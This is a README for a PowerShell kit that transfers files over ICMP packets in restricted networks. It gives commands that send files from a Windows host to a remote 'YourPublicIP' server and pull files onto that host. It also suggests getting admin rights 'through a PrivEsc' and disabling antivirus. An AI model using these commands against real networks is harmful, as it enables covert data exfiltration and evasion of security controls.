# ICMP-TransferTools-PowerShell

## Table of Contents
- [Overview](#overview)
- [Tool Descriptions](#tool-descriptions)
  - [ICMP-SendFile.ps1](#icmp-sendfileps1)
  - [ICMP-ReceiveFile.ps1](#icmp-receivefileps1)
  - [Invoke-IcmpDownload.ps1](#invoke-icmpdownloadps1)
  - [Invoke-IcmpUpload.ps1](#invoke-icmpuploadps1)
- [Installation and Prerequisites](#installation-and-prerequisites)
- [Usage Examples](#usage-examples)
- [Administrative Privileges and Alternatives](#administrative-privileges-and-alternatives)
- [PowerShell vs Python Version](#powershell-vs-python-version)
- [Validation](#validation)

## Overview
ICMP-TransferTools-PowerShell is a set of PowerShell scripts designed to transfer files between Windows hosts using ICMP packets. This approach enables file transfers in restricted network environments without relying on traditional file transfer methods.

## Tool Descriptions
### ICMP-SendFile.ps1
**Description:** Transfers a file over ICMP to a remote host that is running the Invoke-IcmpDownload.ps1 script.

**Usage:**
```
ICMP-SendFile.ps1 -source YourPublicIP -destination TargetIP -file FileToSend -blockSize 1000 -verbose
```
- `source`: Public IP address of the sending machine.
- `destination`: Public IP address of the receiving machine.
- `file`: The file to transfer over ICMP.
- `blockSize`: Size of each data packet (default: 1000 bytes).
- `verbose`: Enables detailed progress logging.

### ICMP-ReceiveFile.ps1
**Description:** Receives an ICMP-based file transfer from Invoke-IcmpUpload.ps1.

**Usage:**
```
ICMP-ReceiveFile.ps1 -src ClientIP -file DestinationFileName
```
- `src`: Public IP address of the sender.
- `file`: Destination file where received data will be saved.

### Invoke-IcmpDownload.ps1
**Description:** Downloads a file via ICMP by communicating with ICMP-SendFile.ps1.

**Usage:**
```
Invoke-IcmpDownload -ServerIP YourPublicIP -FileName FileToDownload
```
- `ServerIP`: The IP of the machine running ICMP-SendFile.ps1.
- `FileName`: The name of the file to be downloaded.

### Invoke-IcmpUpload.ps1
**Description:** Uploads a file over ICMP to a remote system that is running ICMP-ReceiveFile.ps1.

**Usage:**
```
Invoke-IcmpUpload -ServerIP YourPublicIP -FileName FileToUpload
```
- `ServerIP`: The IP of the system receiving the file.
- `FileName`: The name of the file to be uploaded.

## Installation and Prerequisites
- **Required PowerShell Version:** PowerShell 5.1+
- **Firewall Rules:** Ensure ICMP traffic is allowed between sender and receiver.

## Administrative Privileges and Alternatives
### When Admin Rights Are Required:
- ICMP-ReceiveFile.ps1 and ICMP-SendFile.ps1 require admin rights to modify ICMP firewall rules.
- Run PowerShell as administrator before executing these scripts.

### Alternative Without Admin Rights:
- If admin rights are unavailable, get them through a PrivEsc 

## PowerShell vs Python Version
With the conversion of ICMP-ReceiveFile.py and ICMP-SendFile.py to PowerShell, there are no fundamental changes to the way these tools function. The PowerShell versions remain fully compatible with Invoke-IcmpDownload.ps1 and Invoke-IcmpUpload.ps1, maintaining seamless file transfers.

### Key Differences & Alternative Considerations
- **Performance Considerations:** PowerShell's handling of ICMP packets might introduce slight differences in execution timing, but this does not impact overall functionality.

## Validation
The repository ICMP-TransferTools-PowerShe11, is a fork of the original ICMP-TransferTools developed by Icyguider. This suite comprises PowerShell scripts designed to transfer files to and from Windows hosts in restricted network environments using ICMP packets.

### Components:
- **ICMP-SendFile.ps1:** A PowerShell script that stages and sends a file to a Windows host over ICMP.
- **Invoke-IcmpDownload.ps1:** A PowerShell script that runs on the Windows host to receive the file sent by ICMP-SendFile.ps1.
- **ICMP-ReceiveFile.ps1:** A PowerShell script that listens for incoming files sent from a Windows host over ICMP.
- **Invoke-IcmpUpload.ps1:** A PowerShell script that runs on the Windows host to send a file to the PowerShell receiver over ICMP.

### Validation Steps:
To ensure all components work correctly together, follow these steps:

#### Prepare the Windows Environment:
1. Ensure you have administrative privileges on the Windows host.
2. Open PowerShell with elevated rights.
3. Set the execution policy to allow the running of scripts:
   ```
   Set-ExecutionPolicy RemoteSigned
   ```

#### Testing File Download to Windows Host:
- **On the Sender Machine:**
  ```
  ICMP-SendFile.ps1 -source YourPublicIP -destination TargetIP -file FileToSend
  ```
- **On the Windows Host:**
  ```
  .\Invoke-IcmpDownload.ps1 -ServerIP YourPublicIP -FileName FileToDownload
  ```

#### Testing File Upload from Windows Host:
- **On the Receiver Machine:**
  ```
  ICMP-ReceiveFile.ps1 -src ClientIP -file DestinationFileName
  ```
- **On the Windows Host:**
  ```
  .\Invoke-IcmpUpload.ps1 -ServerIP YourPublicIP -FileName FileToUpload
  ```

### Considerations:
- **Network Configuration:** Ensure that ICMP traffic is allowed between the machines. Some network environments may block ICMP, preventing functionality.
- **Permissions:** Administrative privileges are required on both sender and receiver to execute these scripts successfully.
- **Antivirus and Security Software:** Some security solutions may flag or block ICMP-based file transfers. You may need to configure exceptions or temporarily disable such software during testing.

By following these steps, you can validate that all components of the ICMP-TransferTools suite work correctly and cohesively.
